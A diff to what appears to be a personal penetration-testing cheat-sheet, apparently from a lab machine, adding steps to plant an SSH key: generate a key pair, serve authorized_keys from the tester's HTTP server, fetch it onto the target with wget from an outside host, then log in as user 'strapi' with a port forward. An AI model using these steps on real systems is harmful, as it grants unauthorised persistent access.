@@ -392,6 +392,18 @@ to extract data from a hex file
 hexdump -C [file_name]
 ```
 
+```ssh privilage
+ssh-keygen
+cp id_rsa.pub authorized_keys
+python3 -m http.server 80
+```
+
+exploit
+
+```
+wget http://10.10.16.10/authorized_keys
+ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92
+```
 
 
 
